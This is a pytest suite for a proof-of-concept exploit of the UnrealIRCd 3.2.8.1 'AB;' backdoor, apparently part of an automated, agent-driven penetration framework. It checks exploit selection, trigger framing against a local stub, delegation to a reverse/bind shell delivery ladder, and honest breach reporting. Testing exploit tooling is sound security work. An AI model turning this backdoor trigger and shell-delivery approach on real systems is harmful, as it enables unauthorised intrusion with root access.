#!/usr/bin/env python3
"""test_poc_unrealircd.py — proves the curated UnrealIRCd 3.2.8.1 PoC BITES.

UnrealIRCd 3.2.8.1 (CVE-2010-2075) shipped with a backdoor: any line beginning
``AB;`` is executed as a shell command by the daemon (running as its service user
— root on Metasploitable 2). The PoC no longer hand-rolls its own bind-shell
delivery: it exposes the backdoor as a single-command injector (``_send_ab``) and
hands that to the shared delivery ladder (``pocs._delivery.establish_rce``), which
walks reverse → bind → blind-callback and confirms the breach with a per-attempt
nonce. This suite pins that the PoC:

  1. is *selected* automatically for port 6667 / ircd,
  2. self-checks clean offline (hardens under --network=none, no target),
  3. frames the ``AB;`` trigger correctly on the wire (the one bit of real logic
     left in the module),
  4. delegates delivery to establish_rce and emits the HALO-EVIDENCE breach line,
  5. that stdout trips the REAL breach evidence regex (no fake success), and
  6. reports an unconfirmed ladder result as a FAILURE (patched daemon / closed
     port), never a false breach.

The delivery ladder itself (reverse/bind/blind + the nonce challenge-response that
makes a tarpit unable to forge success) is exercised in test_delivery.py; here we
stub establish_rce to exercise the PoC's own contract without the network.
"""

import re
import socket
import threading

import pytest

import poc_library
from pocs import unrealircd_3281_backdoor as unreal
from pocs import _delivery
from agent_loop import breach_confirmed, _SHELL_EVIDENCE


# ── selection ─────────────────────────────────────────────────────────────────
def test_selects_unrealircd_poc_for_port_6667():
    sel = poc_library.select_poc("6667", "IRC — often UnrealIRCd 3.2.8.1 backdoor")
    assert sel is not None
    key, code = sel
    assert key == "unrealircd_3281_backdoor"
    assert "AB;" in code
    assert "TARGET_IP" not in code               # must not trip the placeholder guard


def test_no_curated_poc_for_plain_ssh():
    assert poc_library.select_poc("22", "SSH") is None


def test_shipped_code_matches_the_tested_module():
    # Task 11: the shipped bundle inlines pocs/_delivery.py so the single file runs
    # self-contained in the sandbox, so it is no longer byte-for-byte the module
    # file. The behavioural invariant still holds: the bundle carries this PoC's own
    # body AND the shared delivery ladder, with the sibling import removed.
    _, code = poc_library.select_poc("6667", "unrealircd")
    with open(unreal.__file__) as f:
        module_src = f.read()
    assert "AB;" in code                           # the backdoor trigger
    assert "def run_from_env(env)" in code          # the module's entry point
    assert "def establish_rce" in code              # inlined _delivery ladder
    assert "HALO-EVIDENCE" in code                  # inlined _delivery body
    assert "from pocs._delivery" not in code        # sibling import stripped
    assert "from pocs._delivery" in module_src      # (still present in the source)
    assert "TARGET_IP" not in code


# ── self-check (offline TEST phase) ──────────────────────────────────────────
def test_selfcheck_is_clean_offline():
    # test phase runs --network=none with no TARGET; the PoC must still exit 0
    # with real stdout so the hardening loop passes it to the fire gate.
    rc, out = unreal.run_from_env({})   # no TARGET
    assert rc == 0
    assert out.strip() != ""
    assert "TARGET_IP" not in out


# ── the AB; trigger is framed correctly on the wire ─────────────────────────
def test_send_ab_frames_backdoor_trigger():
    """_send_ab must deliver exactly MAGIC + <cmd> + newline to the daemon — this
    is the only real network logic the module still owns after delegating delivery."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]
    received = {}

    def serve():
        conn, _ = srv.accept()
        with conn:
            conn.settimeout(5)
            conn.sendall(b":irc.local NOTICE AUTH :*** hi\r\n")   # banner
            data = b""
            try:
                while b"\n" not in data:
                    chunk = conn.recv(256)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
            received["line"] = data

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    unreal._send_ab("127.0.0.1", port, "echo pwned", timeout=5)
    t.join(5)
    srv.close()
    assert received.get("line") == unreal.MAGIC + b"echo pwned" + b"\n"


# ── delegation + structured evidence ─────────────────────────────────────────
def test_exploit_delegates_to_establish_rce(monkeypatch):
    seen = {}

    def fake_establish(inject, target, **kw):
        seen["target"] = target
        seen["service"] = kw.get("service")
        seen["nonce"] = kw.get("nonce")
        seen["inject_callable"] = callable(inject)
        return _delivery.Breach(confirmed=True, level="shell", nonce=kw.get("nonce", "n"),
                                proof="uid=0(root)", uid="0", exit_code="0")
    monkeypatch.setattr(unreal, "establish_rce", fake_establish)
    br = unreal.exploit("10.0.0.9", irc_port=6667, nonce="deadbeef")
    assert br.confirmed
    assert seen == {"target": "10.0.0.9", "service": "unrealircd",
                    "nonce": "deadbeef", "inject_callable": True}


def test_unrealircd_attack_emits_structured_evidence(monkeypatch):
    import pocs.unrealircd_3281_backdoor as u
    # stub establish_rce so we exercise run_from_env's contract, not the network
    from pocs import _delivery
    def fake_establish(inject, target, **kw):
        return _delivery.Breach(confirmed=True, level="shell", nonce=kw.get("nonce", "n"),
                                proof="uid=0(root)", uid="0", host="victim", exit_code="0")
    monkeypatch.setattr(u, "establish_rce", fake_establish, raising=False)
    rc, out = u.run_from_env({"TARGET": "10.0.0.1:6667", "HALO_NONCE": "abc123"})
    assert rc == 0
    assert "HALO-EVIDENCE" in out and "nonce=abc123" in out


def test_breach_output_trips_real_breach_evidence(monkeypatch):
    """The HALO-EVIDENCE line the PoC prints must trip the REAL breach heuristic —
    both the shell-evidence regex and the nonce-bound run_exploit gate."""
    def fake_establish(inject, target, **kw):
        return _delivery.Breach(confirmed=True, level="shell", nonce=kw.get("nonce", "n"),
                                proof="uid=0(root) gid=0(root)", uid="0",
                                host="metasploitable", exit_code="0")
    monkeypatch.setattr(unreal, "establish_rce", fake_establish)
    rc, out = unreal.run_from_env({"TARGET": "127.0.0.1:6667", "HALO_NONCE": "cafe01"})
    assert rc == 0
    assert _SHELL_EVIDENCE.search(out)
    assert breach_confirmed("run_exploit", out, ok=True, nonce="cafe01") is True


# ── run_from_env never leaks an uncaught exception ──────────────────────────
def test_run_from_env_wraps_exploit_exception(monkeypatch):
    """exploit → establish_rce → local_ip_for(target) can raise socket.gaierror on a
    hostname that fails DNS. run_from_env must catch ANY exception and return
    (1, 'EXPLOIT FAILED: ...') — same contract as the sibling PoCs — never let a
    traceback escape with a non-1 exit code."""
    def boom(*a, **kw):
        raise socket.gaierror("Name or service not known")
    monkeypatch.setattr(unreal, "exploit", boom)
    rc, out = unreal.run_from_env({"TARGET": "somehost:6667", "HALO_NONCE": "n"})
    assert rc == 1
    assert out.startswith("EXPLOIT FAILED")


# ── no false positives ──────────────────────────────────────────────────────
def test_unconfirmed_ladder_is_reported_as_failure(monkeypatch):
    """A patched daemon / closed port yields an unconfirmed (falsy) Breach from the
    ladder; run_from_env must return non-zero with NO HALO-EVIDENCE line — the
    breach is never faked when the challenge nonce did not come back."""
    def fake_establish(inject, target, **kw):
        return _delivery.Breach(confirmed=False, level="none",
                                nonce=kw.get("nonce", "n"), proof="")
    monkeypatch.setattr(unreal, "establish_rce", fake_establish)
    rc, out = unreal.run_from_env({"TARGET": "127.0.0.1:6667", "HALO_NONCE": "abc123"})
    assert rc == 1
    assert "HALO-EVIDENCE" not in out
    assert breach_confirmed("run_exploit", out, ok=False, nonce="abc123") is False
